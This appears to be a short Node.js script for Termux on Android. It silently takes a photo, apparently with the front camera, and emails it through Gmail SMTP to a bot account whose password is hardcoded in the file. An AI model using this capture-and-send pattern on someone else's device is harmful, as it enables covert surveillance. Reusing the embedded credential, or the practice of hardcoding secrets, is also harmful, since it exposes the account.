const { exec } = require('child_process');
const nodemailer = require('nodemailer');

// Comando para tirar a foto (pode variar dependendo do dispositivo)
const takePhotoCommand = 'termux-camera-photo -c 1 f/photo.jpg';

exec(takePhotoCommand, async (error, stdout, stderr) => {
  if (error) {
    console.error(`Erro ao tirar a foto: ${error.message}`);
    return;
  }
  console.log('Foto tirada com sucesso!');

  // Configurações do serviço SMTP para o envio de e-mails
  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false, // true para SSL/TLS
    auth: {
      user: 'bot54331@gmail.com',
      pass: 'ujmmpeelkfygcxrs'
    }
  });

  // Configurações de envio do e-mail
  const mailOptions = {
    from: 'bot54331@gmail.com',
    to: 'bot54331@gmail.com',
    subject: 'photo',
    text: 'foto:',
    attachments: [
      {
        path: 'f/photo.jpg'
      }
    ]
  };

  // Envio do e-mail
  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error(`Erro ao enviar o email: ${err.message}`);
      return;
    }
    console.log('E-mail enviado com a foto anexada.');
  });
});
